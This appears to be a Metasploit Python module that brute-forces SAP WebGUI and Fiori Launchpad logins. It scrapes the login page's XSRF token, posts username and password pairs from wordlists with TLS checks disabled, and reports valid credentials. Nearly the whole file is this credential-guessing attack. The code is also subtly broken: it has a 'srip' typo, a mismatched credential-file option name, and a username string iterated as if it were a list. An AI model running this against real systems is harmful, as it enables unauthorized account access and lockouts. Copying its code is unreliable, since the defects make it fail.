#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# standard modules
import logging

# extra modules
dependencies_missing = False
try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    from bs4 import BeautifulSoup
except ImportError:
    dependencies_missing = True

from metasploit import module

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

metadata = {
    'name': 'SAP Web GUI & Fiori Launchpad Bruteforce',
    'description': '''
        This module attempts to brute force SAP username and passwords through the SAP WebGUI or Fiori Launchpad service.
        Default clients can be tested without needing to set a CLIENT.
        Keep in mind, that login/fails_to_user_lock parameter allows a maximum of 99 failed logins.
    ''',
    'references': [],
    'authors': [
        'Julian Petersohn <julian@petersohn.it>'
    ],
    'date': '2021-06-03',
    'license': 'MSF_LICENSE',
    'type': 'single_scanner',
    'options': {
        'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/sap/bc/gui/sap/its/webgui'},
        'RPORT': {'type': 'port', 'description': 'Target port', 'required': True},
        'SAP_SID': {'type': 'string', 'description': 'Target SAP SID', 'required': True},
        'SAP_CLIENT': {'type': 'string', 'description': 'Target SAP client', 'required': False, 'default': '001'},
        'BRUTE_MODE': {'type': 'string', 'description': 'Which endpoint you want to attack (webgui/fiori)', 'required': False, 'default': 'webgui'},
        'SSL': {'type': 'bool', 'description': 'use SSL (true/false)', 'required': True, 'default': False},
        'CRED_FILE': {'type': 'string', 'description': 'Wordlist with usernames and passwords separated by : (Example: user:password)', 'required': False},
        'USER_FILE': {'type': 'string', 'description': 'Wordlist with usernames', 'required': False},
        'PASS_FILE': {'type': 'string', 'description': 'Wordlist with passwords', 'required': False}
    }
}

def build_url(server, port, targeturi, https_check):
    if https_check == "true":
        url =  "https://{}:{}{}".format(str(server), str(port), str(targeturi))
    else:
        url =  "http://{}:{}{}".format(str(server), str(port), str(targeturi))
    
    return str(url)

def fiori_login(url, username, password, client):
    session = requests.session()
    r = session.get(url, verify=False, allow_redirects=True)
    soup = BeautifulSoup(r.text, 'lxml')
    csrf_token = soup.select('input', name="sap-login-XSRF")[6]
    xsrf_cookie = csrf_token['value']

    PARAMS = {
	'sap-system-login-oninputprocessing':'onLogin',
	'sap-urlscheme':'',
	'sap-system-login':'onLogin',
	'sap-system-login-basic_auth':'',
	'sap-client':client,
	'sap-accessibility':'',
	'sap-login-XSRF': xsrf_cookie,
	'sap-system-login-cookie_disabled':'',
	'sap-hash':'',
	'sap-user':username,
	'sap-password':password,
	'sap-language':'EN'
	}
    
    r = session.post(url, data=PARAMS, verify=False)
    if (r.status_code == 200) and (len(r.history)>0):
        login_success = True
    else:
        login_success = False

    return login_success

def webgui_login(url, username, password, client, sid):

    session = requests.session()
    r = session.get(url, verify=False, allow_redirects=True)
    r = session.get(url, verify=False, allow_redirects=True)
    soup = BeautifulSoup(r.text, 'lxml')
    csrf_token = soup.select('input', name="sap-login-XSRF")[6]
    xsrf_cookie = csrf_token['value']

    PARAMS = {
        'FOCUS_ID': 'sap-user',
        'sap-system-login-oninputprocessing': 'onLogin',
        'sap-urlscheme': '',
        'sap-system-login': 'onLogin',
        'sap-system-login-basic_auth': '',
        'sap-accessibility': '',
        'sap-login-XSRF': xsrf_cookie,
        'sap-system-login-cookie_disabled': '',
        'sysid': sid,
        'sap-client': client,
        'sap-user': username,
        'sap-password': password,
        'sap-language': 'EN',
        'sap-language-dropdown': 'English'
    }

    r = session.post(url, data=PARAMS, verify=False)
    if (r.status_code == 200) and (len(r.history)>0):
        login_success = True
    else:
        login_success = False

    return login_success

def bruteforce(usernames, password, url, client, sid, mode):
    for user in usernames:
        module.log("trying: {}:{}".format(user, password), "debug")
        if mode == "webgui":
            login_success = webgui_login(url = url, username = user, password = password, client = client, sid = sid)
        elif mode == "fiori":
            login_success = fiori_login(url = url, username = user, password = password, client = client)
        else:
            module.log("wronge endpoint defined (webgui / fiori)... aborting!", "error")
            raise SystemExit(0)

        if login_success == True:
            module.log("Valid credential {}:{}".format(user, password), "info")
            raise SystemExit(0)
        else:
            pass

def load_wordlist(userfile="", passfile=""):
        user_list = []
        pw_list = []
        with open(userfile, "r") as user_file:
                for user in user_file:
                    user = user.strip("\n")
                    user_list.append(user)
        module.log("usernames loaded", "debug")
            
        with open(passfile) as pwfile:
                for password in pwfile:
                    password = password.srip("\n")
                    pw_list.append(password)

        module.log("passwords loaded", "debug")

        return user_list, pw_list

def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependencies_missing:
        logging.error('Module dependency is missing, cannot continue!')
        return

    url = build_url(server = args['RHOSTS'], port = args['RPORT'], targeturi = args['TARGETURI'], https_check = args['SSL'])

    if (len(args['CRED_FILE'])>0):
        with open(args['CREDENTIAL_FILE'], "r") as credfile:
            for line in credfile:
                line = line.strip()
                username,password = line.split(":", 1)
                try:
                    bruteforce(url = url, usernames = username, password = password, client = args['SAP_CLIENT'], sid = args['SAP_SID'], mode = args['BRUTE_MODE'])
                except Exception as e:
                    logging.error('{}'.format(e))
                    pass
    elif (len(args['USER_FILE'])>0) and (len(args['PASS_FILE'])>0):
        usernames, passwords = load_wordlist(userfile = args['USER_FILE'], passfile = args['PASS_FILE'])
        try:
            for password in passwords:
                bruteforce(url = url, usernames = usernames, password = password, client = args['SAP_CLIENT'], sid = args['SAP_SID'], mode = args['BRUTE_MODE'])
        except Exception as e:
            logging.error('{}'.format(e))
            pass
    else:
        logging.error("please check username/password or credential file for existence or format issues")

if __name__ == '__main__':
    module.run(metadata, run)